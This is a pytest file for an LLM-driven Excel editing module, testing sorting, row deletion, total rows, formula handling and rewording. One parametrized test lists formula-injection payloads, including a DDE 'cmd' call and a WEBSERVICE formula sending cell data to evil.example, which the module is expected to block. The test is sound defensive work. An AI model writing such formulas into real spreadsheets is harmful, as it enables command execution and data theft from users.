import json

import pytest
from openpyxl import Workbook, load_workbook
from openpyxl.styles import Font, PatternFill

from app.editing.engine import EditProgress
from app.editing.layout import LayoutUnsupported
from app.editing.xlsx_ops import (
    XlsxResult,
    apply_ops,
    describe_workbook,
    edit_xlsx,
    parse_ops,
    resolve_column,
    safe_formula,
    sheet_info,
)


def _book(rows=None, title="Sales"):
    wb = Workbook()
    ws = wb.active
    ws.title = title
    for row in rows or [
        ["Name", "Qty", "Price", "Status"],
        ["bolt", 10, 2.5, "open"],
        ["  nut ", 4, 1.25, "Closed"],
        ["washer", 100, 0.1, "open"],
        ["gear", None, 9, ""],
    ]:
        ws.append(row)
    return wb


def _run(wb, *ops, llm=None):
    parsed, dropped = parse_ops({"operations": list(ops)}, wb)
    return apply_ops(wb, parsed, llm), dropped


class FakeLLM:
    """Replies to the operations prompt with `ops`, and to a reword prompt with `rewords`."""

    def __init__(self, ops=None, rewords=None, problem=""):
        self.ops, self.rewords, self.problem = ops or [], rewords or {}, problem
        self.prompts = []

    def chat(self, system, user, temperature=0.2, **kwargs):
        self.prompts.append((system, user))
        if "Excel workbook" in system:
            return json.dumps({"operations": self.ops, "problem": self.problem})
        ids = [item["id"] for item in json.loads(user.split("Paragraphs:\n", 1)[1])]
        return json.dumps({"paragraphs": [{"id": i, "text": self.rewords[i]} for i in ids if i in self.rewords]})


# ---------- what the model is shown ----------


def test_the_model_sees_headers_column_letters_and_real_row_numbers():
    listing = describe_workbook(_book())

    assert 'Sheet "Sales"' in listing and "header row 1" in listing
    assert "A=Name" in listing and "C=Price" in listing
    assert "  2 | bolt | 10 | 2.5 | open" in listing


def test_a_title_above_the_table_does_not_hide_the_header_row():
    wb = _book([["Quarterly stock"], [], ["Name", "Qty", "Price"], ["bolt", 1, 2]])
    assert sheet_info(wb.active).header_row == 3


def test_columns_are_found_by_letter_or_by_header_text():
    ws = _book().active
    info = sheet_info(ws)
    assert resolve_column(ws, info, "C") == 3 and resolve_column(ws, info, "c") == 3
    assert resolve_column(ws, info, "price") == 3 and resolve_column(ws, info, " Status ") == 4
    assert resolve_column(ws, info, "Z") is None and resolve_column(ws, info, "Nope") is None


# ---------- reading the model's reply ----------


def test_bad_operations_are_dropped_with_a_reason():
    wb = _book()
    ops, dropped = parse_ops(
        {
            "operations": [
                {"op": "explode"},
                {"op": "set_cell", "cell": "not a cell", "value": 1},
                {"op": "set_cell", "sheet": "Other", "cell": "A1", "value": 1},
                {"op": "add_column"},
                {"op": "sort"},
                {"op": "transform_column", "column": "A", "transform": "reverse"},
                {"op": "delete_rows_where", "column": "A", "test": "equals"},
                {"op": "set_cell", "cell": "e2", "value": "ok"},
            ]
        },
        wb,
    )
    assert [(o.kind, o.cell) for o in ops] == [("set_cell", "E2")]
    assert len(dropped) == 7


def test_a_number_can_name_the_column():
    ops, _ = parse_ops({"operations": [{"op": "sort", "column": 3}]}, _book())
    assert ops[0].column == "C"


# ---------- operations ----------


def test_add_column_with_a_formula_per_row_and_a_header_that_matches():
    wb = _book()
    wb.active["D1"].font = Font(bold=True)
    wb.active["D1"].fill = PatternFill("solid", start_color="FFFF00")
    report, _ = _run(wb, {"op": "add_column", "header": "Total", "formula": "=B{row}*C{row}"})
    ws = wb.active

    assert ws["E1"].value == "Total" and ws["E1"].font.bold and ws["E1"].fill.start_color.rgb == "00FFFF00"
    assert ws["E2"].value == "=B2*C2" and ws["E2"].data_type == "f" and ws["E5"].value == "=B5*C5"
    assert report.done == ["added the column “Total” (E)"]


def test_add_column_with_a_constant():
    wb = _book()
    _run(wb, {"op": "add_column", "header": "Checked", "value": "no"})
    assert [c.value for c in wb.active["E"]] == ["Checked", "no", "no", "no", "no"]


@pytest.mark.parametrize(
    "formula",
    [
        "=HYPERLINK(\"http://evil.example\",\"click\")",
        "=cmd|' /C calc'!A0",
        "='[other.xlsx]Sheet1'!A1",
        "=WEBSERVICE(\"http://evil.example/\"&A1)",
        "=INDIRECT(\"[x.xlsx]S!A1\")",
        "=IMPORTXML(\"http://evil\",\"//a\")",
        "=1+1&\"\\\\server\\share\"",
    ],
)
def test_formulas_that_reach_outside_the_workbook_are_never_written(formula):
    wb = _book()
    report, _ = _run(wb, {"op": "set_cell", "cell": "F2", "value": formula})

    assert wb.active["F2"].value is None
    assert not report.done and "not allowed" in report.skipped[0]
    assert not safe_formula(formula)


def test_ordinary_formulas_are_allowed():
    for formula in ["=B2*C2", "=SUM(B2:B5)", '=IF(D2="open","yes","no")', "=VLOOKUP(A2,A:C,3,FALSE)", "=A2&\" \"&D2"]:
        assert safe_formula(formula)
    assert not safe_formula("not a formula")


def test_set_column_and_set_cell():
    wb = _book()
    _run(wb, {"op": "set_column", "column": "Status", "value": "reviewed"}, {"op": "set_cell", "cell": "A1", "value": "Item"})
    assert [c.value for c in wb.active["D"]][1:] == ["reviewed"] * 4 and wb.active["A1"].value == "Item"


def test_transform_column():
    wb = _book([["n", "v"], ["  hello   world ", "$1,200.50"], ["ABC", "7"], ["x", 5], ["y", "n/a"]])
    _run(wb, {"op": "transform_column", "column": "n", "transform": "trim"})
    assert wb.active["A2"].value == "hello world"
    _run(wb, {"op": "transform_column", "column": "A", "transform": "upper"})
    assert [c.value for c in wb.active["A"]][1:] == ["HELLO WORLD", "ABC", "X", "Y"]
    _run(wb, {"op": "transform_column", "column": "B", "transform": "to_number"})
    assert [c.value for c in wb.active["B"]][1:] == [1200.5, 7, 5, "n/a"]


def test_find_replace_in_a_column_or_everywhere_and_a_missing_column_is_not_everywhere():
    wb = _book()
    _run(wb, {"op": "find_replace", "find": "OPEN", "replace": "active", "column": "D"})
    assert [c.value for c in wb.active["D"]][1:] == ["active", "Closed", "active", ""]

    wb = _book()
    _run(wb, {"op": "find_replace", "find": "bolt", "replace": "screw"})
    assert wb.active["A2"].value == "screw"

    wb = _book()
    report, _ = _run(wb, {"op": "find_replace", "find": "bolt", "replace": "screw", "column": "Nonexistent"})
    assert wb.active["A2"].value == "bolt" and "no column" in report.skipped[0]

    wb = _book()
    _run(wb, {"op": "find_replace", "find": "BOLT", "replace": "x", "match_case": True})
    assert wb.active["A2"].value == "bolt"  # case mattered


def test_delete_rows_where_removes_the_right_rows_from_the_bottom_up():
    wb = _book()
    report, _ = _run(wb, {"op": "delete_rows_where", "column": "Status", "test": "equals", "value": "open"})
    assert [c.value for c in wb.active["A"]] == ["Name", "  nut ", "gear"]
    assert report.done == ["removed 2 rows"]

    wb = _book()
    _run(wb, {"op": "delete_rows_where", "column": "Qty", "test": "gt", "value": 5})
    assert [c.value for c in wb.active["A"]] == ["Name", "  nut ", "gear"]

    wb = _book()
    _run(wb, {"op": "delete_rows_where", "column": "Qty", "test": "empty"})
    assert wb.active.max_row == 4


def _with_value_column(total_row=False):
    wb = _book()
    ws = wb.active
    ws["E1"] = "Value"
    for r in range(2, 6):
        ws[f"E{r}"] = f"=B{r}*C{r}"
    if total_row:
        ws["A6"], ws["B6"], ws["E6"] = "Total", "=SUM(B2:B5)", "=SUM(E2:E5)"
    return wb


def test_deleting_rows_keeps_every_formula_pointing_at_its_own_row():
    wb = _with_value_column()
    _run(wb, {"op": "delete_rows_where", "column": "A", "test": "contains", "value": "washer"})
    ws = wb.active

    assert [c.value for c in ws["A"]][1:] == ["bolt", "  nut ", "gear"]
    assert [ws[f"E{r}"].value for r in (2, 3, 4)] == ["=B2*C2", "=B3*C3", "=B4*C4"]  # gear moved from row 5 to row 4
    assert ws.max_row == 4


def test_a_total_row_stays_at_the_bottom_and_its_ranges_follow_the_data():
    wb = _with_value_column(total_row=True)
    info = sheet_info(wb.active)
    assert info.footer == 1 and info.last_row == 6

    _run(wb, {"op": "delete_rows_where", "column": "Status", "test": "equals", "value": "open"})
    ws = wb.active

    assert [c.value for c in ws["A"]] == ["Name", "  nut ", "gear", "Total"]
    assert ws["B4"].value == "=SUM(B2:B3)" and ws["E4"].value == "=SUM(E2:E3)"
    assert ws["E2"].value == "=B2*C2" and ws["E3"].value == "=B3*C3"
    assert ws.max_row == 4


def test_a_total_row_is_not_sorted_or_filled_like_data():
    wb = _with_value_column(total_row=True)
    _run(wb, {"op": "sort", "column": "Name", "descending": True})
    ws = wb.active
    assert ws["A6"].value == "Total" and ws["B6"].value == "=SUM(B2:B5)"  # untouched
    assert [c.value.strip() for c in ws["A"][1:5]] == ["washer", "nut", "gear", "bolt"]

    _run(wb, {"op": "set_column", "column": "D", "value": "x"})
    assert ws["D6"].value is None and ws["D5"].value == "x"


def test_total_rows_are_recognised_by_label_or_by_aggregate_formulas_but_not_ordinary_rows():
    wb = _book([["a", "b"], ["x", 1], ["y", 2], ["Subtotal", 3]])
    assert sheet_info(wb.active).footer == 1
    wb = _book([["a", "b"], ["x", 1], [None, "=SUM(B2:B2)"]])
    assert sheet_info(wb.active).footer == 1
    wb = _book([["a", "b"], ["x", 1], ["totally normal", 2]])  # "totally" is not "total"
    assert sheet_info(wb.active).footer == 0


def test_sorting_or_deleting_warns_when_other_sheets_have_formulas_that_may_point_here():
    wb = _with_value_column()
    wb.create_sheet("Summary")["A1"] = "=SUM(Sales!B2:B5)"
    report, _ = _run(wb, {"op": "sort", "sheet": "Sales", "column": "Name"})
    assert any("other sheets" in w for w in report.warnings)


def test_sort_numbers_and_text_with_blanks_last():
    wb = _book()
    _run(wb, {"op": "sort", "column": "Qty", "descending": True})
    assert [c.value for c in wb.active["B"]][1:] == [100, 10, 4, None]
    assert [c.value for c in wb.active["A"]][1:] == ["washer", "bolt", "  nut ", "gear"]  # rows stay together

    wb = _book()
    _run(wb, {"op": "sort", "column": "Name"})
    assert [c.value.strip() for c in wb.active["A"][1:]] == ["bolt", "gear", "nut", "washer"]


def test_sorting_moves_formulas_with_their_rows():
    wb = _with_value_column()
    _run(wb, {"op": "sort", "column": "Name", "descending": True})
    ws = wb.active

    assert [c.value.strip() for c in ws["A"][1:]] == ["washer", "nut", "gear", "bolt"]
    for r in range(2, 6):
        assert ws[f"E{r}"].value == f"=B{r}*C{r}"  # each formula reads its own row's cells


def test_sorting_by_a_column_of_formulas_orders_by_their_values_not_their_text(monkeypatch):
    import app.editing.xlsx_ops as xlsx_ops

    wb = _with_value_column()
    # what LibreOffice would calculate: bolt 25, nut 5, washer 10, gear 18
    monkeypatch.setattr(
        xlsx_ops, "computed_values", lambda book: {("Sales", "E2"): 25, ("Sales", "E3"): 5, ("Sales", "E4"): 10, ("Sales", "E5"): 18}
    )
    _run(wb, {"op": "sort", "column": "Value", "descending": True})
    ws = wb.active

    assert [c.value.strip() for c in ws["A"][1:]] == ["bolt", "gear", "washer", "nut"]
    assert [ws[f"E{r}"].value for r in range(2, 6)] == ["=B2*C2", "=B3*C3", "=B4*C4", "=B5*C5"]  # formulas follow their rows


def test_deleting_rows_by_a_formula_column_tests_the_calculated_values(monkeypatch):
    import app.editing.xlsx_ops as xlsx_ops

    wb = _with_value_column()
    monkeypatch.setattr(
        xlsx_ops, "computed_values", lambda book: {("Sales", "E2"): 25, ("Sales", "E3"): 5, ("Sales", "E4"): 10, ("Sales", "E5"): 18}
    )
    _run(wb, {"op": "delete_rows_where", "column": "Value", "test": "lt", "value": 12})
    assert [c.value.strip() for c in wb.active["A"][1:]] == ["bolt", "gear"]


def test_without_libreoffice_a_sort_by_formulas_is_refused_not_done_wrong(monkeypatch):
    import app.editing.xlsx_ops as xlsx_ops

    wb = _with_value_column()
    monkeypatch.setattr(xlsx_ops, "computed_values", lambda book: None)
    report, _ = _run(wb, {"op": "sort", "column": "Value"})

    assert "LibreOffice" in report.skipped[0] and wb.active["A2"].value == "bolt"  # nothing was moved


def test_a_sort_by_plain_values_never_needs_libreoffice(monkeypatch):
    import app.editing.xlsx_ops as xlsx_ops

    monkeypatch.setattr(xlsx_ops, "computed_values", lambda book: pytest.fail("LibreOffice was asked for nothing"))
    wb = _with_value_column()  # has formulas, but the sort column is plain numbers
    _run(wb, {"op": "sort", "column": "Qty"})
    assert [c.value for c in wb.active["B"]][1:] == [4, 10, 100, None]  # the blank goes last


def test_rename_header_sheet_and_format():
    wb = _book()
    report, _ = _run(
        wb,
        {"op": "rename_header", "column": "Qty", "new_header": "Quantity"},
        {"op": "format_column", "column": "Price", "format": "currency"},
        {"op": "rename_sheet", "new_name": "2024/Q1"},
    )
    ws = wb.worksheets[0]
    assert ws["B1"].value == "Quantity" and ws["C2"].number_format == '"$"#,##0.00'
    assert ws.title == "2024 Q1"  # characters Excel forbids become spaces
    assert len(report.done) == 3


def test_reword_cells_uses_the_model_cell_by_cell():
    wb = _book()
    llm = FakeLLM(rewords={2: "vis", 3: "écrou", 4: "rondelle", 5: "engrenage"})
    report, _ = _run(wb, {"op": "reword_cells", "column": "Name", "instruction": "translate to French"}, llm=llm)

    assert [c.value for c in wb.active["A"]][1:] == ["vis", "écrou", "rondelle", "engrenage"]
    assert report.done == ["reworded column A (4 cells)"]


def test_a_failing_operation_does_not_lose_the_others():
    wb = _book()
    report, _ = _run(
        wb,
        {"op": "transform_column", "column": "Nope", "transform": "upper"},
        {"op": "set_cell", "cell": "A1", "value": "Item"},
    )
    assert wb.active["A1"].value == "Item" and report.skipped


def test_two_sheets_need_the_sheet_named():
    wb = _book()
    wb.create_sheet("Other").append(["x"])
    ops, dropped = parse_ops({"operations": [{"op": "set_cell", "cell": "A1", "value": 1}]}, wb)
    assert not ops and "which sheet" in dropped[0]
    ops, _ = parse_ops({"operations": [{"op": "set_cell", "sheet": "other", "cell": "A1", "value": 1}]}, wb)
    assert ops[0].sheet == "Other"


# ---------- the whole edit ----------


def test_edit_xlsx_end_to_end_keeps_the_formatting_of_what_it_did_not_touch(tmp_path):
    src, dst = tmp_path / "in.xlsx", tmp_path / "out.xlsx"
    wb = _book()
    wb.active["A1"].font = Font(bold=True, color="FF0000")
    wb.active.column_dimensions["A"].width = 33
    wb.save(src)
    llm = FakeLLM(ops=[{"op": "add_column", "header": "Total", "formula": "=B{row}*C{row}"}])

    updates = list(edit_xlsx(src, dst, "add a total column", llm))

    assert isinstance(updates[0], EditProgress)
    result = updates[-1]
    assert isinstance(result, XlsxResult) and "Total" in result.summary and result.changed > 0
    out = load_workbook(dst).active
    assert out["E2"].value == "=B2*C2"
    assert out["A1"].font.bold and out["A1"].font.color.rgb == "00FF0000"
    assert out.column_dimensions["A"].width == 33
    assert load_workbook(src).active["E1"].value is None  # the original is untouched


def test_when_the_model_says_it_cannot_do_it_the_reason_reaches_the_user(tmp_path):
    src = tmp_path / "in.xlsx"
    _book().save(src)
    llm = FakeLLM(problem="the workbook has no customer addresses")

    with pytest.raises(ValueError, match="no customer addresses"):
        list(edit_xlsx(src, tmp_path / "out.xlsx", "add each customer's address", llm))
    assert not (tmp_path / "out.xlsx").exists()


def test_an_empty_workbook_or_a_broken_file_is_refused(tmp_path):
    empty = tmp_path / "empty.xlsx"
    Workbook().save(empty)
    with pytest.raises(LayoutUnsupported, match="empty"):
        list(edit_xlsx(empty, tmp_path / "o.xlsx", "x", FakeLLM()))

    broken = tmp_path / "broken.xlsx"
    broken.write_bytes(b"not a zip")
    with pytest.raises(LayoutUnsupported, match="couldn't be opened"):
        list(edit_xlsx(broken, tmp_path / "o.xlsx", "x", FakeLLM()))


def test_charts_the_edit_cannot_keep_are_mentioned(tmp_path):
    from openpyxl.chart import BarChart, Reference

    src = tmp_path / "in.xlsx"
    wb = _book()
    chart = BarChart()
    chart.add_data(Reference(wb.active, min_col=2, min_row=1, max_row=4), titles_from_data=True)
    wb.active.add_chart(chart, "G2")
    wb.save(src)

    result = list(edit_xlsx(src, tmp_path / "o.xlsx", "x", FakeLLM(ops=[{"op": "set_cell", "cell": "A1", "value": "Item"}])))[-1]
    assert any("charts" in w for w in result.warnings)
